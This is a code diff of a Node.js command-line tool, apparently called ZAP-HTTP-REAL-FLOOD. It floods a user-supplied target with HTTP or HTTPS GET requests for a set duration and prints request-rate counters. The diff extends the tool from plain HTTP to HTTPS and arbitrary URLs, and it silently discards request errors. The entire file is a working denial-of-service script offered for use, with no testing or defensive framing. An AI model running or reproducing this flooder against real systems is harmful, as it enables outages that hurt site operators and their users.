@@ -1,4 +1,6 @@
 const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 const readline = require('readline');
 
 const rl = readline.createInterface({
@@ -9,66 +11,67 @@ const rl = readline.createInterface({
 const prompt = (q) => new Promise(res => rl.question(q, res));
 const clear = () => process.stdout.write('\x1Bc');
 
-let totalRequests = 0;
-let lastRequests = 0;
+let total = 0;
+let last = 0;
 let maxRPS = 0;
-let logger;
 
-async function startFlood() {
+async function start() {
     clear();
     console.log("jrl@zap.live >");
 
-    const target = await prompt("[¿T] > ");
+    const rawTarget = await prompt("[¿T] > ");
     const duration = parseInt(await prompt("[¿DU!] > ")) || 60;
+
+    const url = new URL(rawTarget.startsWith('http') ? rawTarget : `http://${rawTarget}`);
     const end = Date.now() + duration * 1000;
+    const client = url.protocol === 'https:' ? https : http;
 
     clear();
 
-    logger = setInterval(() => {
-        const rps = totalRequests - lastRequests;
-        lastRequests = totalRequests;
+    setInterval(() => {
+        const rps = total - last;
         maxRPS = Math.max(maxRPS, rps);
+        last = total;
 
         clear();
-        console.log("ZAP-HTTP-SENDNDIP");
-        console.log(`Requests:      ${totalRequests}`);
-        console.log(`Reqs/sec:      ${rps}`);
-        console.log(`Max Req/sec:   ${maxRPS}`);
+        console.log("ZAP-HTTP-REAL-FLOOD");
+        console.log(`Requests:     ${total}`);
+        console.log(`Reqs/sec:     ${rps}`);
+        console.log(`Max Req/sec:  ${maxRPS}`);
     }, Math.floor(Math.random() * 2000) + 3000);
 
-    function sendRequest() {
+    function blast() {
         if (Date.now() > end) return stop();
 
         const options = {
-            host: target,
-            port: 80,
-            path: "/",
+            hostname: url.hostname,
+            port: url.port || (url.protocol === 'https:' ? 443 : 80),
+            path: url.pathname || "/",
             method: "GET",
             headers: {
                 'User-Agent': 'Mozilla/5.0',
                 'Accept': '*/*',
-                'Connection': 'close'
+                'Connection': 'close',
             }
         };
 
-        const req = http.request(options);
-        req.on('error', () => {});
+        const req = client.request(options);
+        req.on('error', () => {}); // swallow fails
         req.end();
 
-        totalRequests++;
-        setImmediate(sendRequest);
+        total++;
+        setImmediate(blast);
     }
 
-    sendRequest();
+    blast();
 }
 
 function stop() {
-    clearInterval(logger);
     clear();
-    console.log("ZAP-HTTP-SENDNDIP DONE");
-    console.log(`Total Requests: ${totalRequests}`);
-    console.log(`Max Req/sec:    ${maxRPS}`);
+    console.log("ZAP-HTTP-REAL-FLOOD DONE");
+    console.log(`Requests:     ${total}`);
+    console.log(`Max Req/sec:  ${maxRPS}`);
     process.exit(0);
 }
 
-startFlood();
+start();
